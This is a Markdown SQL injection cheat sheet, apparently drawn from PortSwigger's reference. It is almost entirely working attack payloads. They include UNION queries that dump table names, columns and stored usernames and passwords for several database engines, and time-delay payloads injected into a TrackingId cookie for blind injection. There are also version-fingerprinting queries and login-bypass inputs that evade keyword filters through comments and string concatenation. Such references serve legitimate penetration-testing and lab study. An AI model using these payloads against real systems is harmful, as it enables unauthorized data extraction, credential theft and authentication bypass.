# [Portswigger SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Leak Database Contents
### Oracle
`' UNION SELECT NULL,NULL FROM DUAL-- -`
`' UNION SELECT TABLE_NAME, NULL FROM all_tables-- -`
`' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE TABLE_NAME=<TABLE_NAME>-- -`
`' UNION SELECT USERNAME, PASSWORD FROM <TABLE_NAME>-- -`
### SQLite
	' UNION SELECT name FROM sqlite_master;-- - (Get table names and SQL statement to create them with table column names)
	' UNION SELECT <target_column_name> FROM <target_table_name>;-- -
### Others
	' UNION SELECT NULL, NULL-- - (check if union based SQLi is available, change the number of NULLs)
	' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES-- - (get all table names)
	' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = <table_name>-- - (get all column names for a table)

## String Concatenation
### Oracle
	'foo'||'bar'
### Microsoft
	'foo'+'bar'
### PostgreSQL
	'foo'||'bar'
### MySQL
	'foo' 'bar' (space between)
	CONCAT('foo','bar')
### Concat Two Results Into One Column
	' UNION SELECT COLUMN1 || '~' || COLUMN2 FROM TABLE-- -

## Conditional Time Delays
### Oracle
	TrackingId=abc'||(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(10) ELSE NULL END FROM dual)-- 
### Microsoft SQL
	TrackingId=abc'; WAITFOR DELAY '0:0:10'-- 
	TrackingId=abc'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
### MySQL
	TrackingId=xyz' OR SLEEP(10)-- 
	TrackingId=xyz'||(SELECT SLEEP(10))-- 
### PostgreSQL
	TrackingId=xyz'||(SELECT pg_sleep(10))-- 
	TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END)-- 

## Substring Function
### Oracle
	SUBSTR('foobar',4,2)

### Others
	SUBSTRING('foobar',4,2)

## DB Version
### Oracle
	SELECT banner FROM v$version
	SELECT version FROM v$instance

### Microsoft
	SELECT @@version

### PostgreSQL
	SELECT version()

### MySQL
	SELECT @@version

## Extra Payloads
### Bypassing Filters (or)
**username: admin'-- -** (The username must be known)
**password: password123**

### Bypassing Filters (or, and, like, =, --, <, >)
**username: admin'/\*** (The username must be known)
**password: password123**

### Bypassing Filters (or, and, like, =, --, <, >, union, admin (or the known username))
**username: ad'||'min'/\*** (Uses concatenation to form the word *admin*)
**password: password123**

### Bypassing Filters (or and true false union like = > < ; -- /* */ admin (or the known username))
**username: ad'||'min**
**password: a' is not 'b** (Evaluates to true)

### Equality Check Order
Take the following SQL statement for a login page as an example:

	`SELECT id FROM users WHERE password = 'admin' AND username = 'admin'`

The password value is being checked before the username value so the following will not work:
**username: john' or 1=1-- -**
**password: password123**

That is because the comment operator `--` is placed at the end of the SQL statement and therefore has no effect. Instead the correct payload would be:
**username: john**
**password: password123' or 1=1-- -**
